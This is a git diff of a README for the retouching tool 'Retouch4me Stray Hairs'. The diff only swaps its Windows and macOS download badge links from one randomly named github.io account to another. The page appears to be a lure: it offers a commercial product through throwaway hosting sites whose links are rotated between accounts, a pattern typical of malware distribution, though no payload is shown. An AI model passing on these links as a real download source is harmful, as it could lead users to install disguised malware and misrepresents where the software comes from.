@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Retouch4me Stray Hairs](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_RETOUCH4ME_STRAY_HAIRS-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://DenFencerStare.github.io/win-get/)
+[![Download Retouch4me Stray Hairs](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_RETOUCH4ME_STRAY_HAIRS-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://DikeSupporterFurnish.github.io/windows-installer/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **Retouch4me Stray Hairs** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-B71C1C?style=for-the-badge&logo=windows&logoColor=white)](https://DenFencerStare.github.io/win-get/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-B71C1C?style=for-the-badge&logo=apple&logoColor=white)](https://DenFencerStare.github.io/mac-get/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-B71C1C?style=for-the-badge&logo=windows&logoColor=white)](https://DikeSupporterFurnish.github.io/windows-installer/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-B71C1C?style=for-the-badge&logo=apple&logoColor=white)](https://DikeSupporterFurnish.github.io/macos-installer/)
 
 </div>
 
